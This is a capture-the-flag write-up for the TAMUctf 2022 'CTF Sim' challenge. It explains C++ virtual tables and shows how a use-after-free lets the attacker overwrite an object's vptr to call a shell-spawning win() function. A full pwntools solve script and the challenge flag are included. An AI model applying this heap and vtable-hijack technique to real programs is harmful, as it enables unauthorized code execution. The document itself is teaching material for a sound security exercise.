---
title: TAMUctf 2022 â€“ CTF Sim
description: Oops, your vpointer was redirected.
updated: "2022-08-07"
tags: ctf pwn writeup python cpp
---

{% include toc.md %}

### Challenge Description
Wanna take a break from the ctf to do another ctf?

### Write-Up
Ooooh, a C++ challenge. This seems like a fun little exercise.

#### Preliminary Observations and Analysis
We're provided with a C++ file and its compiled ELF. Upon an initial browse through the source, we see something interesting:

```cpp
void win() {
    system("/bin/sh");
}

void* win_addr = (void*) &win;
```

A `win` function is already provided, along with a global variable `win_addr` storing the address of `win`.

Now on to the fun stuff. We have six classes with the `solve` virtual function: one base class and the other five inheritting and overriding `solve`.

```cpp
struct challenges { virtual void solve() { /* ... */ } };
struct forensics : challenges { virtual void solve() { /* ... */ } };
struct reversing : challenges { virtual void solve() { /* ... */ } };
struct pwn : challenges { virtual void solve() { /* ... */ } };
struct web : challenges { virtual void solve() { /* ... */ } };
struct crypto : challenges { virtual void solve() { /* ... */ } };
```

We then have three action functions:

1. `downloadChallenge`, which `new`s one of the five derived classes,
2. `solveChallenge`, which selects a downloaded challenge (at index `i`), then calls `->solve` and `delete`s it, and
3. `submitWriteup`, which calls `malloc`s with custom size. Wow.

Interestingly, the `malloc`ed chunk isn't `free`d anywhere! Also in `solveChallenge`, the value of `downloaded[i]` isn't removed after being `delete`d... This is starting to smell like a [double free][doublefree] or use-after-free vulnerability. But is it?

Let's start by defining helper functions in Python to help us pwn and perform a certain action:

```py
def download_chal(category: int, save_index: int):
    if not (1 <= category <= 5 and 0 <= save_index <= 3):
        raise RuntimeError("bad bad")

    p.sendlineafter(b"> ", b'1')
    p.sendlineafter(b"> ", str(category).encode())
    p.sendlineafter(b"> ", str(save_index).encode())

def solve_chal(index: int):
    if not (0 <= index <= 3):
        raise RuntimeError("bad bad")
    
    p.sendlineafter(b"> ", b'2')
    p.sendlineafter(b"> ", str(index).encode())

def submit_writeup(content: bytes, length: int = None):
    if length is None:
        length = len(content) + 1
    elif len(content) >= length:
        raise RuntimeError("your math bad bad")
    
    if b'\n' in content:
        raise RuntimeError("bad bad newline")

    p.sendlineafter(b"> ", b'3')
    p.sendlineafter(b"> ", str(length).encode())
    p.sendlineafter(b"> ", content)
```

Now we just need to figure out the order to call these...

<!-- 
```cpp
challenges* downloaded [4];

void downloadChallenge() {
    int choice;
    int index;

    while (true) {
        // ...
        cin >> choice;
        // ...
        cin >> index;
        
        if ((choice >= 1 && choice <=5) && (index >= 0 && index <= 3)) {
            break;
        }
        else {
            cout << "Invalid category or index" << endl;
        }
    }

    if (choice == 1) {
        downloaded[index] = new forensics;
    }
    else if (choice == 2) {
        downloaded[index] = new reversing;
    }
    else if (choice == 3) {
        downloaded[index] = new pwn;
    }
    else if (choice == 4) {
        downloaded[index] = new web;
    }
    else {
        downloaded[index] = new crypto;
    }
}

void solveChallenge() {
    int index;
    while (true) {
        // ...
        cin >> index;

        if (index >= 0 && index <= 3) {
            break;
        }
    }

    downloaded[index] -> solve();
    delete downloaded[index];
}

void submitWriteup() {
    int length;
    // ...
    cin >> length;
    // ...
    cin.get();
    char* writeup;
    writeup = (char*) malloc(length);

    fgets(writeup, length, stdin);
}
``` -->

#### Virtual Tables
Since virtual functions are used, it helps to know how they work under the hood.

I found a couple useful resources:

* a [StackOverflow answer][vtable-so]
* a [well-written blog post][vtable-pablo] by one named Pablo

I'll try my best to summarise the wisdom found there:

* If a class has a virtual function...
  * ...the class has a vtable.
  * ...objects of the class contains an *implicit* "vptr" member.
    * In memory, the vptr is placed at the *very beginning* of the object.
    * The vptr points to the vtable of the class.
* The vtable is a list of pointers to the concrete implementations of the virtual functions.
* When a virtual function is called, the vtable is accessed through the vptr. The vtable is then used to **lookup** the appropriate virtual function and pass it the appropriate parameters.

To better understand vtables and vpointers, here's a virtual function example in C++ along with a desugared version written in C.

C++ Version:

```cpp
class Parent {
public:
    // void* vtable; // Implicit, but exists due to virtual functions.
    int parent_data;
    Parent(int data) : parent_data{data} {}

    virtual void foo(int x) { std::cout << "parent (" << parent_data << ") foo: " << x << std::endl; }
    virtual void bar(int x) { std::cout << "parent (" << parent_data << ") bar: " << x << std::endl; }
};

// Inherits Parent::parent_data and Parent::foo.
class Derived : public Parent {
public:
    // void* vtable; // Implicit for same reason as Parent.
    int derived_data;
    Derived(int data, int data2) : Parent{data}, derived_data{data2} {}

    // Overrides Parent::bar.
    virtual void bar(int x) { std::cout << "derived (" << parent_data << ", " << derived_data << ") bar: " << x << std::endl; }
};

int main() {
    Parent p{1};
    p.foo(2); // Parent::foo
    p.bar(3); // Parent::bar

    Derived d{5, 6};
    d.foo(7); // Parent::foo
    d.bar(8); // Derived::bar
}
```
<sup>([godbolt demo][gb-vtable-cpp])</sup>


C Version:

```c
typedef void (*funcptr_t)(); // Type alias for function pointers.

typedef struct {
    funcptr_t* vtable;
    int parent_data;
} Parent;

typedef struct {
    funcptr_t* vtable;
    int parent_data; // Inheritted from Parent.
    int derived_data;
} Derived;

// Enumeration of virtual functions.
enum { VFUNCTION_FOO, VFUNCTION_BAR };

// Concrete implementations.
void parent__foo(Parent* p, int x) { printf("parent (%d) foo: %d\n", p->parent_data, x); }
void parent__bar(Parent* p, int x) { printf("parent (%d) bar: %d\n", p->parent_data, x); }
void derived__bar(Derived* d, int x) { printf("derived (%d, %d) bar: %d\n", d->parent_data, d->derived_data, x); }

// Virtual implementations (redirect).
void foo(Parent* p, int x) { p->vtable[VFUNCTION_FOO]((void*)p, x); }
void bar(Parent* p, int x) { p->vtable[VFUNCTION_BAR]((void*)p, x); }

// vtable definitions.
funcptr_t parent__vtable[] = {
    parent__foo,
    parent__bar,
};

funcptr_t derived__vtable[] = {
    parent__foo,
    derived__bar,
};

int main(void) {
    Parent p = {.vtable=parent__vtable, .parent_data=1};
    foo(&p, 2); // parent__foo
    bar(&p, 3); // parent__bar.

    Derived d = {.vtable=derived__vtable, .parent_data=5, .derived_data=6};
    foo((Parent*)&d, 7); // parent__foo
    bar((Parent*)&d, 8); // derived__bar.
}
```
<sup>([godbolt demo][gb-vtable-c], inspired from [this gist](https://gist.github.com/michahoiting/1aec1c95881881add9a20e9839c35cec))</sup>

So to reiterate and relate how this works with ctf_sim.cpp:

* By observation, each class (`challenge`, `forensic`, `reversing`, etc.) has a virtual function.
* Therefore each class has a vtable.
* Also an object of any class (`challenge`, `forensic`, etc.) has a vptr.
* This vptr points to the corresponding vtable of the class.
  * e.g. a `forensic` object will have a vptr pointing to the `forensic` vtable.
  * a `pwn` object will have a vptr pointing to the `pwn` vtable.


#### Exploitation

Combining our knowledge of vtables/vpointers with a little bit of heap knowledge, we come up with the following exploit:

```py 
# downloaded[0] = new forensics;   (vptr points to forensic's vtable.)
download_chal(1, 0)

# delete downloaded[0];    (chunk is moved to tcache/fast bin. downloaded[0] itself is unchanged!)
solve_chal(0)

# Chunk is allocated-- reusing the chunk previously deallocated.
# Overwrite vptr of downloaded[0] with &(&win).
submit_writeup(p64(elf.sym['win_addr']), 0x10)

# downloaded[0]->solve() triggers double dereference (due to virtual function resolution) and calls win()!
solve_chal(0)
```

To explain the "little bit of heap knowledge", we just need to understand that C++'s `new`/`delete` behaves like C's `malloc`/`free`: `new` will allocate a chunk, and `delete` will move the chunk to a bin. The next `new` with a similar chunk size will reuse the chunk, meaning we overwrite the same memory previously allocated!



### Solve Scripts
```py
from pwn import *

binary = 'ctf_sim'

context.binary = binary
context.log_level = 'debug'

elf = ELF(binary)
rop = ROP(binary)

p = remote("tamuctf.com", 443, ssl=True, sni="ctf-sim")


def download_chal(category: int, save_index: int):
    if not (1 <= category <= 5 and 0 <= save_index <= 3):
        raise RuntimeError("bad bad")

    p.sendlineafter(b"> ", b'1')
    p.sendlineafter(b"> ", str(category).encode())
    p.sendlineafter(b"> ", str(save_index).encode())

def solve_chal(index: int):
    if not (0 <= index <= 3):
        raise RuntimeError("bad bad")
    
    p.sendlineafter(b"> ", b'2')
    p.sendlineafter(b"> ", str(index).encode())

def submit_writeup(content: bytes, length: int = None):
    if length is None:
        length = len(content) + 1
    elif len(content) >= length:
        raise RuntimeError("your math bad bad")
    
    if b'\n' in content:
        raise RuntimeError("bad bad newline")

    p.sendlineafter(b"> ", b'3')
    p.sendlineafter(b"> ", str(length).encode())
    p.sendlineafter(b"> ", content)

# downloaded[0] = new forensics;   (vptr points to forensic's vtable.)
download_chal(1, 0)

# delete downloaded[0];    (chunk is moved to tcache/fast bin. downloaded[0] itself is unchanged!)
solve_chal(0)

# Chunk is allocated-- reusing the chunk previously deallocated.
# Overwrite vptr of downloaded[0] with &(&win).
submit_writeup(p64(elf.sym['win_addr']), 0x10)

# downloaded[0]->solve() triggers double dereference (due to virtual function resolution) and calls win()!
solve_chal(0)

p.interactive()
```

### Flag
```
gigem{h34pl355_1n_53477l3}
```

[doublefree]: https://heap-exploitation.dhavalkapil.com/attacks/double_free
[vtable-so]: https://stackoverflow.com/a/99341/10239789
[vtable-pablo]: https://pabloariasal.github.io/2017/06/10/understanding-virtual-tables/
[gb-vtable-cpp]: https://godbolt.org/#z:OYLghAFBqd5QCxAYwPYBMCmBRdBLAF1QCcAaPECAMzwBtMA7AQwFtMQByARg9KtQYEAysib0QXACx8BBAKoBnTAAUAHpwAMvAFYTStJg1DIApACYAQuYukl9ZATwDKjdAGFUtAK4sGIM6SuADJ4DJgAcj4ARpjE/gDspAAOqAqETgwe3r7%2ByanpAiFhkSwxcWaJdpgOGUIETMQEWT5%2BAVU1AnUNBEUR0bEJtvWNzTltwz2hfaUDFQCUtqhexMjsHOYAzKHI3lgA1CYbbk4KBMSYrIfYJhoAgje3O0wKCnvKDYwEB/FWd0leUVoeGQIAee3Be1CXySH0EAH10Ex6odfrcIW9YQQIFC9oj6nM9iA9jDzvC8UwTD9yZSACLfKzxGkPMEQgBueEaXjEe1ZqDw6D2/FQ2MEe1UBMpFj2p3QIBQSy%2BhzcSoOZjMJM%2Bewg5jMByOKo1ZKRTD1yqOqrMBKFRJ1ppVqjt5plctctBR3yZd3R7M53N5/L2UQaIq%2B4vp0oIsvlXkV%2BvNOsNX21asdbmJmIRxtTFoJQbiFuzDqVKudIFd7tpzMZKIeTxeexpsTwrMwAqJ/0BwIxpMVPweHaBIJZ4JxWGIzdbmeRG1R6Mb45b6BDuONpEhovJlsJ3c%2BkupjLXY4n6CnFKpxrMtPplbuw55HIIXNoPL5Arzy7DkojUbQMezOqPRctVtYtzUTU9/zVNcQLjNNAMnclIK3PMbRTUC0yLWDvxdBh0DdGcPSrJkZ2ZO4cRYJhQggCU%2By9CF3h7YlJS4SsSLo8EkgAOiFCBLXdAB6fid0EOUhTvLj3w2OYBKEhjPjlPNSLRCF52PXFJQAVjXAA2VjZwhdBuNQYV4mkgjBOEghROMu9DPfAAOMypQs1TFwUhoiI4BZaE4DTeD8DgtFIVBOGVSxrGlJYVkwVUNh4UgrMCryFgAaxADSNH0ThJH8zReBCjheAUEBMsSrQFjgWAYEQeUWCSOhYnISg0Dqhq4mALgzC4Pg6AIWJiogKI8tIKJQgaABPTh4pathBAAeQYWhJqS0gsAooxxBW/BzhqFtipWzBVGqGM1iCqFMB8lagSiYgJo8LBhrOPAWCmry%2BAMYAFAANTwTAAHc5qSRhXpkQQRDEdgpFB%2BQlDUYbdG6gwjBQaxrH0PAomKyAFlQJJHAEfaiou6p8b8CBXFGPxuuCKYSjKPQUjSUnKYZ/JSd6OmBm69pSa6EZPBaPQedqCYOf6OJuYmFnJe6MWZglhYFCi1Y9DOTA1h4bzfNylaCtUeztIAWm0yQ9mAZBkD2TrOK4LUwqsSw11wQgSFi7q9g8Vr6GIN25l4MrktINKMqyjgctIF6Q4CoKCqKkqEryirqogJAFX%2BAgmogFr6u98JWDWfWjZNs2Latswbd4VsXfHWVuv4MHRHEKH65hlR1BWhHSD%2B26klerWOD80ho/yzg5pjdO9lQKgxQN43TfNy3rdtiBPZz2Jff9xOFgQC4x0ofvw8jzLh%2BCzg49Kreg/SzLLo2HWY7PhOkrmfuzHvkfCqf8qFhbYg0mcSQQA
[gb-vtable-c]: https://godbolt.org/#z:OYLghAFBqd5QCxAYwPYBMCmBRdBLAF1QCcAaPECAMzwBtMA7AQwFtMQByARg9KtQYEAysib0QXACx8BBAKoBnTAAUAHpwAMvAFYTStJg1AB9U8lJL6yAngGVG6AMKpaAVxYMQAJlIOAMngMmABy7gBGmMQgkj4ADqgKhLYMzm4e3qTxiTYCAUGhLBFRMRaYVjkMQgRMxASp7p4%2BlpjWyVU1BHkh4ZHRTdW19en9HV0FRX0AlBaorsTI7BwApF4AzIHIblgA1EurjgoE%2BKgAdAh72EsaAIJX1wQAnrGYWFTbAG6oeOjbEABUVFcDGQsQIxGMBEmEEmewAQnc7o9nq9todiK5rLsAOzwm7bfHbQHA0Hggh/D7VML0OF3AnbQIEbaxGqMAjGdBMao0m5LLEAEW2yhZgm5txuSJemDeaIxjN5uOudKJILBEPJ70p1NWCrpDKZwrZHK52tpBL1WGIeHeL3ZnKYot5Ar5kStLwdN0Y7mxsO2ADUAGJyYKOAAqAEkAPLBYz%2BiMR0h%2BwPB8NR4yw64AJWxfLh2wA9HnttgGO5IpzkttUG93nhaq4xISga0BAoTndPt99cRWaZ%2BKgIELu4JybEE3rVJNvUzLYIqBAVl5mUPGfOvABWdCTvsgXbr9BLNeOBgLhOxAC0FyXPaNTATE9zjvbXx%2BV8EpjCNQHBpHY8E2wnU6xDOBBzgur4risG6Th%2BUS7huB5HieTIXqs2Dgba1R3jC2rZk%2BnYWq66Dvp%2BzqWta6Dkugv6MgB8rTgyoFeF4BHkb8kFUXBm7bDBO7sQhx5MQm6AoWhBoYbe2zCRcLE2jeWEPvyCI3B2Px9l%2By4/vSf60TiyEXBqTBUpgB6wgGQahpG0axhGB58lAKl/JMo7/thPqPspz7cZ%2Bg6spp46TnR576ZqxlrqZSYWam6YZrZ9nPo5zn3jh7litcyokhCXY9sYBlGSZtm7KsAryqa%2BLocYfakKVWVvsYMFVTyikmjyNzpaqjIyUROUhfla7FUV3rVeVlXVZ1xFkAiTUKnceosEwgQQCpAU4tVPl/rEhXFTiJy5VqfLlbtmAJic6E3nsfJcI%2BzWKgSakrAAbM5XiufmhbDagqDVTBq6PQmqwvQWNVsnVNRti1N34qRhGSZt3o7T1RVjd1hn0Mdp12uda7HWNZ1FfdV06rdH1QGtZIwl490cViANvWJFUfV9n7qb55OUwmAAcNOSS65HjWDtz8hw0y0Jwa68J4HBaKQqCcI4qKzPMmC7qsPCkAQmhC9MADWIBrho%2BicJI4sa9LnC8AoID6%2BrktC6QcCwDAiAoKgLCxHQkTkJQaCu%2B7UTIMAXBeFwfB0AQkQWxAYQm2EgQ1A8nCq97bCCBGDC0PHNukFgc1GOImf4N2rTWhbmeYKoLSuGHJsMmUJu0HgYTEHHzhYCbYJ4CwCe21QBjAAovp4JgADuEbPBLqv8IIIhiOwUgyIIigqOome6MHBhGCApjGOY9dhBbkDTKgoLJCX5tlC0FT2AwTguA0ej%2BIE3SFL0wdZEkAhDJ4r8JO/DBjD0URg7NGbJUAYdRb7pCAefEB7Raj/2foAiwYDP56EOKMR%2B4wX7TAUArBYegwSYEWDwYWotjaZxlhwVQ7N7pnnupIbYwBkDIG2IHE4XBfiOATLgQgJBlbB22M4H29BiB8MmLwa2WhJja11vrEWHAjakE7nrUgEspYUPNpbNWGtpj2ydrMAgsRK6ewgN7N2wjgisEWFQmhdCGFMJYV4NhvAXg8MtOgPQk9hCiHEHPTxi81Am1XqQIeTdYhdxIRwMWKiTYUIjJXQxjIqz/mobQ%2BhjDmGsPYRAQRZjIiiPEdo6YCBMBMAtJQCJCilH61UbwdRFhNESM1qQHWyi5GrDIWos2WibZSINhwLwHTaldMab060xBEh2EkEAA%3D%3D
